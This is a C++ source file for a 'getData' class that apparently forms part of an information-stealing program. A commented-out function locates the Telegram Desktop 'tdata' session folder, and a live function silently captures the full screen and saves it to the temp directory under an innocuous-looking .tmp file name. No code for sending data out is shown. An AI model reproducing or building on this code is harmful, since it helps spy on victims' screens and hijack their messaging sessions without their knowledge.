#include "getdata.h"


getData::getData() {

}
getData::~getData() {

}

//char* getData::getTgPath() {
//    char* temp;
//    _dupenv_s(&temp, 0, "APPDATA");
//
//    size_t len = strlen(temp) + 24;
//    char* path = (char*)malloc(len);
//
//    sprintf(path, "%s\\Telegram Desktop\\tdata", temp);
//
//    return path;
//}

int getData::GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
    UINT num = 0;
    UINT size = 0;

    Gdiplus::GetImageEncodersSize(&num, &size);
    if (size == 0)
        return -1;

    Gdiplus::ImageCodecInfo* pImageCodecInfo = (Gdiplus::ImageCodecInfo*)(malloc(size));
    if (pImageCodecInfo == NULL)
        return -1;

    Gdiplus::GetImageEncoders(num, size, pImageCodecInfo);

    for (UINT j = 0; j < num; ++j) {
        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {
            *pClsid = pImageCodecInfo[j].Clsid;
            free(pImageCodecInfo);
            return j;
        }
    }

    free(pImageCodecInfo);
    return -1;
}



void getData::takescreenshot(int screenWidth, int screenHeight) {
    TCHAR tempDirectory[MAX_PATH];
    GetTempPath(MAX_PATH, tempDirectory);

    std::string temp = std::string(tempDirectory) + "\\_CL_ff7649205141kq.tmp";
    //std::cout << tempDirectory;
    std::wstring widestr = std::wstring(temp.begin(), temp.end());
    const wchar_t* imagepath = widestr.c_str();
    
    HDC hdcScreen = GetDC(NULL);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, screenWidth, screenHeight);
    HBITMAP hOldBitmap = (HBITMAP)SelectObject(hdcMem, hBitmap);
    
    BitBlt(hdcMem, 0, 0, screenWidth, screenHeight, hdcScreen, 0, 0, SRCCOPY | CAPTUREBLT);
    SelectObject(hdcMem, hOldBitmap);

    Gdiplus::Bitmap bitmap(hBitmap, NULL);
    CLSID clsid;
    GetEncoderClsid(L"image/png", &clsid);

    // debug
    bitmap.Save(imagepath, &clsid, NULL);
    /* bitmap.Save(L"screenshot.png", &clsid, NULL);*/
    DeleteObject(hBitmap);
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);
}